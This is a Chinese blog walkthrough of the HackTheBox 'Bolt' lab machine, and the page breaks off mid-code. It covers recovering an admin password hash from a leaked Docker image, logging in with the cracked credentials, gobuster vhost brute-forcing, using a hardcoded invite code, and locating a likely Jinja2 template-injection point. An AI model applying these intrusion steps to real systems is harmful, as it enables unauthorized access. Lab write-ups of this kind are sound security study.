<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"mi3aka.eu.org","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>



<link rel="canonical" href="https://mi3aka.eu.org/2022/01/06/htb-Bolt/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mi3aka.eu.org/2022/01/06/htb-Bolt/","path":"2022/01/06/htb-Bolt/","title":"HackTheBox-Bolt"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>HackTheBox-Bolt | Misaka's Blog</title>
  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Misaka's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-首页"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-关于"><a href="/about" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-归档"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-安全"><a href="https://github.com/mi3aka/huaQ" rel="noopener" target="_blank"><i class="fas fa-shield-alt fa-fw fa-fw"></i>安全</a></li><li class="menu-item menu-item-工具"><a href="https://tools.mi3aka.eu.org/" rel="noopener" target="_blank"><i class="fas fa-tools fa-fw"></i>工具</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Misaka</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">35</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll site-overview-item animated">
    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://akarin.dev/" title="https:&#x2F;&#x2F;akarin.dev" rel="noopener" target="_blank">存在感消失的地方|ω•`)</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://passbya.xyz/" title="https:&#x2F;&#x2F;passbya.xyz&#x2F;" rel="noopener" target="_blank">PassbyAの阿瓦隆</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://tearsjin.github.io/" title="https:&#x2F;&#x2F;tearsjin.github.io&#x2F;" rel="noopener" target="_blank">K1rit0</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://hengy1.top/" title="https:&#x2F;&#x2F;hengy1.top&#x2F;" rel="noopener" target="_blank">恒HengY1毅</a>
        </li>
    </ul>
  </div>

        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/mi3aka" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://mi3aka.eu.org/2022/01/06/htb-Bolt/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Misaka">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Misaka's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="HackTheBox-Bolt | Misaka's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HackTheBox-Bolt
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-01-06 14:08:30" itemprop="dateCreated datePublished" datetime="2022-01-06T14:08:30+08:00">2022-01-06</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-07-01 16:34:58" itemprop="dateModified" datetime="2022-07-01T16:34:58+08:00">2022-07-01</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>nmap扫描结果</p>
<span id="more"></span>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292037992.png"></p>
<p>把<code>10.10.11.114    bolt.htb</code>和<code>10.10.11.114    passbolt.bolt.htb</code>加到<code>/etc/hosts</code>中</p>
<p><a target="_blank" rel="noopener" href="http://passbolt.bolt.htb/uploads/image.tar">http://passbolt.bolt.htb/uploads/image.tar</a>有个压缩包可以下载</p>
<blockquote>
<p>分析压缩包</p>
</blockquote>
<p>在<code>image/745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/config.py</code>中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2019 - present AppSeed.us</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span>   decouple <span class="keyword">import</span> config</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Config</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    basedir    = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set up the App SECRET_KEY</span></span><br><span class="line">    SECRET_KEY = config(<span class="string">&#x27;SECRET_KEY&#x27;</span>, default=<span class="string">&#x27;S#perS3crEt_007&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This will create a file in &lt;app&gt; FOLDER</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;sqlite:///&#x27;</span> + os.path.join(basedir, <span class="string">&#x27;db.sqlite3&#x27;</span>)</span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">False</span></span><br><span class="line">    MAIL_SERVER = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">    MAIL_PORT = <span class="number">25</span></span><br><span class="line">    MAIL_USE_TLS = <span class="literal">False</span></span><br><span class="line">    MAIL_USE_SSL = <span class="literal">False</span></span><br><span class="line">    MAIL_USERNAME = <span class="literal">None</span></span><br><span class="line">    MAIL_PASSWORD = <span class="literal">None</span></span><br><span class="line">    DEFAULT_MAIL_SENDER = <span class="string">&#x27;support@bolt.htb&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ProductionConfig</span>(<span class="title class_ inherited__">Config</span>):</span><br><span class="line">    DEBUG = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Security</span></span><br><span class="line">    SESSION_COOKIE_HTTPONLY  = <span class="literal">True</span></span><br><span class="line">    REMEMBER_COOKIE_HTTPONLY = <span class="literal">True</span></span><br><span class="line">    REMEMBER_COOKIE_DURATION = <span class="number">3600</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># PostgreSQL database</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;&#123;&#125;://&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        config( <span class="string">&#x27;DB_ENGINE&#x27;</span>   , default=<span class="string">&#x27;postgresql&#x27;</span>    ),</span><br><span class="line">        config( <span class="string">&#x27;DB_USERNAME&#x27;</span> , default=<span class="string">&#x27;appseed&#x27;</span>       ),</span><br><span class="line">        config( <span class="string">&#x27;DB_PASS&#x27;</span>     , default=<span class="string">&#x27;pass&#x27;</span>          ),</span><br><span class="line">        config( <span class="string">&#x27;DB_HOST&#x27;</span>     , default=<span class="string">&#x27;localhost&#x27;</span>     ),</span><br><span class="line">        config( <span class="string">&#x27;DB_PORT&#x27;</span>     , default=<span class="number">5432</span>            ),</span><br><span class="line">        config( <span class="string">&#x27;DB_NAME&#x27;</span>     , default=<span class="string">&#x27;appseed-flask&#x27;</span> )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DebugConfig</span>(<span class="title class_ inherited__">Config</span>):</span><br><span class="line">    DEBUG = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Load all possible configurations</span></span><br><span class="line">config_dict = &#123;</span><br><span class="line">    <span class="string">&#x27;Production&#x27;</span>: ProductionConfig,</span><br><span class="line">    <span class="string">&#x27;Debug&#x27;</span>     : DebugConfig</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2</code>中有个<code>db.sqlite3</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install sqlite3</span><br><span class="line">sqlite3 db.sqlite3</span><br><span class="line"></span><br><span class="line">sqlite&gt; .show</span><br><span class="line">        echo: off</span><br><span class="line">         eqp: off</span><br><span class="line">     explain: auto</span><br><span class="line">     headers: off</span><br><span class="line">        mode: list</span><br><span class="line">   nullvalue: &quot;&quot;</span><br><span class="line">      output: stdout</span><br><span class="line">colseparator: &quot;|&quot;</span><br><span class="line">rowseparator: &quot;\n&quot;</span><br><span class="line">       stats: off</span><br><span class="line">       width: </span><br><span class="line">    filename: db.sqlite3</span><br><span class="line">sqlite&gt; .database</span><br><span class="line">main: /home/kali/Downloads/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">User</span><br><span class="line">sqlite&gt; .schema User</span><br><span class="line">CREATE TABLE IF NOT EXISTS &quot;User&quot; (</span><br><span class="line">	id INTEGER NOT NULL, </span><br><span class="line">	username VARCHAR, </span><br><span class="line">	email VARCHAR, </span><br><span class="line">	password BLOB, </span><br><span class="line">	email_confirmed BOOLEAN, </span><br><span class="line">	profile_update VARCHAR(80), </span><br><span class="line">	PRIMARY KEY (id), </span><br><span class="line">	UNIQUE (username), </span><br><span class="line">	UNIQUE (email)</span><br><span class="line">);</span><br><span class="line">sqlite&gt; select * from User;</span><br><span class="line">1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292124162.png"></p>
<p>有个hash之后的密码,反查得知其为<code>deadbolt</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292127456.png"></p>
<p>成功以<code>admin:deadbolt</code>登录<code>bolt.htb</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292129924.png"></p>
<p>但是好像没找到可以利用的点</p>
<p>尝试以<code>admin@bolt.htb:deadbolt</code>登录<code>passbolt.bolt.htb</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292135767.png"></p>
<p>尝试以此进行ssh连接同样失败</p>
<p>推测可能存在其他子域名,用gobuster去爆破<code>./gobuster vhost -u http://bolt.htb -w /mnt/hgfs/Exploits/subdomains-top1million-110000.txt -t 100</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Found: demo.bolt.htb (Status: 302) [Size: 219]</span><br><span class="line">Found: mail.bolt.htb (Status: 200) [Size: 4943]</span><br></pre></td></tr></table></figure>

<p><code>demo.bolt.htb</code>跟<code>bolt.htb</code>的登录框一样,但是无法登录</p>
<p>在<a target="_blank" rel="noopener" href="http://demo.bolt.htb/register">注册页面</a>多了一个邀请码</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292145113.png"></p>
<p>全局搜索<code>Invite Code</code>,发现其在<code>image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/forms.py</code>中出现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2019 - present AppSeed.us</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> TextField, PasswordField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> InputRequired, Email, DataRequired</span><br><span class="line"></span><br><span class="line"><span class="comment">## login and registration</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoginForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    username = TextField    (<span class="string">&#x27;Username&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;username_login&#x27;</span>   , validators=[DataRequired()])</span><br><span class="line">    password = PasswordField(<span class="string">&#x27;Password&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;pwd_login&#x27;</span>        , validators=[DataRequired()])</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CreateAccountForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    username = TextField(<span class="string">&#x27;Username&#x27;</span>     , <span class="built_in">id</span>=<span class="string">&#x27;username_create&#x27;</span> , validators=[DataRequired()])</span><br><span class="line">    email    = TextField(<span class="string">&#x27;Email&#x27;</span>        , <span class="built_in">id</span>=<span class="string">&#x27;email_create&#x27;</span>    , validators=[DataRequired(), Email()])</span><br><span class="line">    password = PasswordField(<span class="string">&#x27;Password&#x27;</span> , <span class="built_in">id</span>=<span class="string">&#x27;pwd_create&#x27;</span>      , validators=[DataRequired()])</span><br><span class="line">    invite_code = TextField(<span class="string">&#x27;Invite Code&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;invite_code&#x27;</span>    , validators=[DataRequired()])</span><br></pre></td></tr></table></figure>

<p>而在<code>routes.py</code>中定义了<code>Invite Code</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292148716.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blueprint.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    login_form = LoginForm(request.form)</span><br><span class="line">    create_account_form = CreateAccountForm(request.form)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;register&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line"></span><br><span class="line">        username  = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        email     = request.form[<span class="string">&#x27;email&#x27;</span>   ]</span><br><span class="line">        code	  = request.form[<span class="string">&#x27;invite_code&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> code != <span class="string">&#x27;XNSS-HSJW-3NGU-8XTJ&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;code-500.html&#x27;</span>)</span><br><span class="line">        data = User.query.filter_by(email=email).first()</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> code == <span class="string">&#x27;XNSS-HSJW-3NGU-8XTJ&#x27;</span>:</span><br><span class="line">            <span class="comment"># Check usename exists</span></span><br><span class="line">            user = User.query.filter_by(username=username).first()</span><br><span class="line">            <span class="keyword">if</span> user:</span><br><span class="line">                <span class="keyword">return</span> render_template( <span class="string">&#x27;accounts/register.html&#x27;</span>, </span><br><span class="line">                                    msg=<span class="string">&#x27;Username already registered&#x27;</span>,</span><br><span class="line">                                    success=<span class="literal">False</span>,</span><br><span class="line">                                    form=create_account_form)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check email exists</span></span><br><span class="line">            user = User.query.filter_by(email=email).first()</span><br><span class="line">            <span class="keyword">if</span> user:</span><br><span class="line">                <span class="keyword">return</span> render_template( <span class="string">&#x27;accounts/register.html&#x27;</span>, </span><br><span class="line">                                    msg=<span class="string">&#x27;Email already registered&#x27;</span>, </span><br><span class="line">                                    success=<span class="literal">False</span>,</span><br><span class="line">                                    form=create_account_form)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># else we can create the user</span></span><br><span class="line">            user = User(**request.form)</span><br><span class="line">            db.session.add(user)</span><br><span class="line">            db.session.commit()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> render_template( <span class="string">&#x27;accounts/register.html&#x27;</span>, </span><br><span class="line">                                msg=<span class="string">&#x27;User created please &lt;a href=&quot;/login&quot;&gt;login&lt;/a&gt;&#x27;</span>, </span><br><span class="line">                                success=<span class="literal">True</span>,</span><br><span class="line">                                form=create_account_form)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template( <span class="string">&#x27;accounts/register.html&#x27;</span>, form=create_account_form)</span><br></pre></td></tr></table></figure>

<p>成功注册并登录</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292150051.png"></p>
<p><code>extras</code>下面挺多功能的,但是好像只是个前端???</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292154767.png"></p>
<p><code>mail.bolt.htb</code>如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292139397.png"></p>
<p>可以用新注册的用户<code>test:test</code>进行登录,从数据库中得到的<code>admin:deadbolt</code>反而不可以…</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292157064.png"></p>
<p>版本是<code>Roundcube Webmail 1.4.6</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292306133.png"></p>
<p>有个sql注入的CVE<a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2021-44026/">CVE-2021-44026</a>,但是没找到利用方式…</p>
<p><code>demo.bolt.htb</code>用到了<code>jinja2</code>和<code>flask</code>猜测可能存在SSTI模板注入</p>
<p>在<code>image</code>中全局搜索<code>render_template_string</code></p>
<p>在<code>image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/home/routes.py</code>中调用了<code>render_template_string</code>,因此可能存在模板注入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blueprint.route(<span class="params"><span class="string">&quot;/example-profile&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Profiles&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;example-profile.html&#x27;</span>, user=user,current_user=current_user)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Experimental Feature&quot;&quot;&quot;</span></span><br><span class="line">        cur_user = current_user</span><br><span class="line">        user = current_user.username</span><br><span class="line">        name = request.form[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        experience = request.form[<span class="string">&#x27;experience&#x27;</span>]</span><br><span class="line">        skills = request.form[<span class="string">&#x27;skills&#x27;</span>]</span><br><span class="line">        msg = Message(</span><br><span class="line">                recipients=[<span class="string">f&#x27;<span class="subst">&#123;cur_user.email&#125;</span>&#x27;</span>],</span><br><span class="line">                sender = <span class="string">&#x27;support@example.com&#x27;</span>,</span><br><span class="line">                reply_to = <span class="string">&#x27;support@example.com&#x27;</span>,</span><br><span class="line">                subject = <span class="string">&quot;Please confirm your profile 